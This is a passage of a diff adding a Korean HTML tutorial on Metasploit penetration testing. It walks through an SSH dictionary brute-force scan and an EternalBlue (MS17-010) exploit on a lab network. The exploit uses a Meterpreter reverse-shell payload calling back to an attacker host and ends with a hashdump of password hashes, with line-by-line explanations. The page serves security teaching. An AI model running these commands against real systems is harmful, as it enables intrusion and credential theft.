+                    <td><span class="line-code">use auxiliary/.../ssh_login</span></td>
+                    <td>직접적인 시스템 파괴 목적이 아닌, 정보 수집 및 인증 취약점 진단을 목적으로 설계된 <span class="highlight">Auxiliary (보조 스캐너 모듈)</span> 중 SSH 로그인 시도 모듈을 장착합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">set USER_FILE ...</span><br><span class="line-code">set PASS_FILE ...</span></td>
+                    <td>해커가 사전에 수집한 유력한 계정명 목록(users.txt)과 자주 쓰이는 비밀번호 사전 파일(Dictionary File, passwords.txt)의 절대 경로를 변수에 매핑합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">run</span></td>
+                    <td>Auxiliary 모듈은 Exploit 모듈과 달리 직접적인 시스템 파괴 공격이 아니므로 관례적으로 <span class="line-code">exploit</span> 대신 <span class="line-code">run</span> 명령어를 입력하여 실행합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Failed: 'admin:12345'</span></td>
+                    <td>사전 파일에 있는 조합을 타겟 서버의 22번 포트(SSH)에 무차별적으로 대입(Brute Force)하며, 실패한 기록을 화면에 출력합니다. (이 과정에서 타겟 서버의 <code>auth.log</code>에 엄청난 에러 로그가 남게 됩니다.)</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Success: 'admin:admin123'</span></td>
+                    <td>수많은 시도 끝에 일치하는 계정과 패스워드 조합을 찾아냈습니다! 즉시 로그인하여 권한(uid=1000)을 확인하고, 통제 가능한 Command Shell 세션을 자동으로 열어줍니다.</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- 5페이지: 실전 시나리오 3 - MS17-010 (EternalBlue) -->
+    <div class="page-break">
+        <h2>5. 실전 모의 해킹 시나리오 III: 윈도우 원격 코드 실행 및 미터프리터</h2>
+        
+        <div class="block-sentence">
+            전 세계를 휩쓸었던 랜섬웨어 '워너크라이(WannaCry)'의 핵심 전파 기술이었던 <strong>MS17-010 (EternalBlue, 이터널블루)</strong> 취약점을 이용해 윈도우 서버를 장악하고, 추적을 피하는 <strong>Meterpreter(미터프리터) 리버스 셸</strong>을 주입하는 최고급 기법입니다.
+        </div>
+
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <div class="flex gap-2"><div class="w-3.5 h-3.5 rounded-full bg-[#ff5f56]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#ffbd2e]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#27c93f]"></div></div>
+                <div class="text-[0.8rem] text-slate-400 font-sans font-bold">msfconsole</div><div class="w-12"></div>
+            </div>
+            <div class="terminal-body">
+<span class="cmd-prompt"><span class="cmd-path">msf6</span> ></span> use exploit/windows/smb/ms17_010_eternalblue
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(...)</span> ></span> set RHOSTS 192.168.50.102
+RHOSTS => 192.168.50.102
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(...)</span> ></span> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(...)</span> ></span> set LHOST 192.168.50.10
+LHOST => 192.168.50.10
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(...)</span> ></span> exploit
+
+<span class="cmd-highlight">[*] Started reverse TCP handler on 192.168.50.10:4444</span> 
+<span class="cmd-highlight">[*] 192.168.50.102:445 - Connecting to target for exploitation.</span>
+<span class="cmd-success">[+] 192.168.50.102:445 - Target OS selected valid for OS indicated by SMB reply</span>
+<span class="cmd-highlight">[*] 192.168.50.102:445 - Sending all but last fragment of exploit packet</span>
+<span class="cmd-success">[*] Sending stage (200262 bytes) to 192.168.50.102</span>
+<span class="cmd-success">[*] Meterpreter session 3 opened (192.168.50.10:4444 -> 192.168.50.102:49158)</span>
+
+<span class="cmd-prompt"><span class="cmd-path">meterpreter</span> ></span> getuid
+<span class="cmd-output">Server username: NT AUTHORITY\SYSTEM</span>
+<span class="cmd-prompt"><span class="cmd-path">meterpreter</span> ></span> hashdump
+<span class="cmd-output">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+            </div>
+        </div>
+
+        <table class="line-analysis-table">
+            <thead><tr><th style="width: 30%;">실행 명령어 및 출력 결과</th><th style="width: 70%;">한 줄 분석 (Line-by-Line Analysis)</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><span class="line-code">use .../ms17_010_eternalblue</span></td>
+                    <td>윈도우의 파일 공유 프로토콜인 SMB(Server Message Block)의 치명적인 메모리 결함을 찌르는 EternalBlue(이터널블루) 공격 모듈을 장착합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">set PAYLOAD .../reverse_tcp</span></td>
+                    <td>공격 성공 후 주입할 악성코드로, 앞서 배운 <span class="highlight">Reverse Shell (리버스 셸, 역방향 접속)</span> 방식을 사용하는 In-Memory(메모리 상주형) 백도어인 미터프리터(Meterpreter)를 명시적으로 세팅합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">set LHOST 192.168.50.10</span></td>
+                    <td>리버스 셸이 성공했을 때, 타겟 컴퓨터가 거꾸로 접속을 맺어야 할 <strong>LHOST (Local Host, 해커 본인의 IP)</strong>를 알려줍니다. 이 설정이 틀리면 공격에 성공해도 연결을 돌려받을 수 없습니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Started reverse TCP handler</span></td>
+                    <td>공격 개시 직후, 해커의 PC가 자신의 4444번 포트를 열고 타겟이 역으로 걸어올 전화를 기다리기(Listen) 시작함을 알립니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Sending stage (200262 bytes)</span></td>
+                    <td>SMB 취약점 버퍼 오버플로우 공격이 성공하여 구멍이 뚫렸고, 그 틈새로 약 200KB 크기의 미터프리터(Meterpreter) 페이로드 핵심 코드를 타겟 RAM(메모리)에 직접 전송(주입)하고 있습니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">meterpreter > getuid</span></td>
+                    <td>강력한 미터프리터 프롬프트를 획득했습니다! <span class="line-code">getuid</span>를 쳐보니 윈도우 OS의 신(God)과 같은 최고 권한인 <span class="highlight">NT AUTHORITY\SYSTEM</span> 권한을 단번에 탈취했음을 확인했습니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">hashdump</span></td>
+                    <td>최고 권한을 바탕으로, 포스트 익스플로잇(Post-Exploitation) 명령어인 <span class="line-code">hashdump</span>를 실행하여 윈도우 내부 SAM 파일에 암호화되어 저장된 모든 사용자의 비밀번호 해시값을 통째로 유출시켰습니다.</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+</div>
+
+</body>
+</html>
